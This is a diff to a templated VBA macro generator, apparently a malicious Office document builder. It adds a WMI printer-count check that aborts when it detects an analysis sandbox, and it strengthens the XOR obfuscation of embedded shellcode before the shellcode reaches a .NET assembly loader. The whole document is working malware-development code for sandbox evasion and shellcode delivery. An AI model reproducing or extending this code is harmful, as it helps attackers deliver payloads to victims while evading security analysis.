@@ -70,6 +70,18 @@ Function {{ v.fn_sandbox }}()
     End If
     On Error GoTo 0
     Set fso2 = Nothing
+    On Error Resume Next
+    Dim wmiPrt As Object, printers As Object, prtCount As Long
+    Set wmiPrt = GetObject("winmgmts:")
+    If Err.Number = 0 Then
+        Set printers = wmiPrt.ExecQuery("SELECT Name FROM Win32_Printer")
+        prtCount = 0
+        Dim oPrt As Object
+        For Each oPrt In printers: prtCount = prtCount + 1: Next
+        If prtCount = 0 Then {{ v.fn_sandbox }} = True: Set wmiPrt = Nothing: Exit Function
+    End If
+    On Error GoTo 0
+    Set wmiPrt = Nothing
 End Function
 
 Sub {{ v.sub_run }}()
@@ -135,11 +147,16 @@ Sub {{ v.sub_run }}()
     sc_hex  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
     key_hex = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
 
+    Dim _k() As Byte
+    _k = {{ v.fn_hex2arr }}(key_hex)
+    Dim _ki As Long
+    For _ki = 0 To UBound(_k): _k(_ki) = _k(_ki) Xor {{ key_tweak }}: Next
+
     Dim sc(), i
     ReDim sc(Len(sc_hex) / 2 - 1)
     For i = 0 To Len(sc_hex) / 2 - 1
         sc(i) = CInt("&H" & Mid(sc_hex, i * 2 + 1, 2)) Xor _
-                CInt("&H" & Mid(key_hex, (i Mod (Len(key_hex) / 2)) * 2 + 1, 2))
+                _k(i Mod (UBound(_k) + 1))
     Next
 
     Dim loader: Set loader = CreateObject("System.Reflection.Assembly")
